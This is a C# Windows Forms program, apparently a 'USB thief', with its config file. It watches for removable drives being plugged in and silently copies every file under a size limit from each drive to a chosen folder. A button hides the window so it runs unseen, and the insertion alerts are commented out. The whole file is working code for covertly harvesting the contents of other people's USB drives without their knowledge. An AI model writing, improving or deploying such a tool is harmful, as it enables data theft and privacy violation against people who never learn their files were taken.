using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
 
namespace FileCopy
{
     
    public partial class FileCopy : Form
    {
        public FileCopy()
        {
            InitializeComponent();
        }
 
        Thread thread = null;   
        public const int WM_DEVICECHANGE = 0x219;
        public const int DBT_DEVICEARRIVAL = 0x8000;
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
        string drivestr; //驱动器名称
        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_DEVICECHANGE)
            {
                switch (m.WParam.ToInt32())
                {
                    case WM_DEVICECHANGE:
                        break;
                    case DBT_DEVICEARRIVAL:
                        {
                            thread = null;
                            //MessageBox.Show("U盘插入....","信息",MessageBoxButtons.OK,MessageBoxIcon.Information);
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable)
                                {                                    
                                    drivestr = drive.Name;
                                    thread = new Thread(new ThreadStart(Copy));//线程实例化
                                    thread.Start();//启动线程
                                }
                            }
                            break;
                        }
                    case DBT_DEVICEREMOVECOMPLETE:
                        {
                            //MessageBox.Show("U盘拔出....","信息",MessageBoxButtons.OK,MessageBoxIcon.Information);
                            thread = null;
                            break;
                        }
                }
            }
            base.WndProc(ref m);
             
        }
 
        string des="";      //拷贝来的文件的存放位置
        private void button_Search_Click(object sender, EventArgs e)
        {
            folderBrowserDialog1.ShowDialog();
            textBox_Des.Text = folderBrowserDialog1.SelectedPath;
            des = textBox_Des.Text;
        }
 
        private void button_Hide_Click(object sender, EventArgs e)
        {
            if(des!="")
            this.Hide();  //后台运行程序
            else
                MessageBox.Show("请选择文件存放位置....", "信息", MessageBoxButtons.OK, MessageBoxIcon.Warning);
 
        }
 
        public void Copy()  //线程函数
        {
            CopyFile(drivestr, (int)numericUpDown_FileSize.Value);
        }
        public void CopyFile(string path,int filesize)
        {
            DirectoryInfo dir = new DirectoryInfo(path);
            foreach (FileInfo FI in dir.GetFiles())
            {
                if (FI.Length <= filesize * 1024 * 1024)
                    try { File.Copy(FI.FullName, des + @"\" + FI.Name); }
                    catch (IOException) { continue; }        
            }
 
            foreach (DirectoryInfo DI in dir.GetDirectories())
            {
                CopyFile(DI.FullName, filesize);
            }
 
        }
 
    }
}

<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />
    </startup>
</configuration>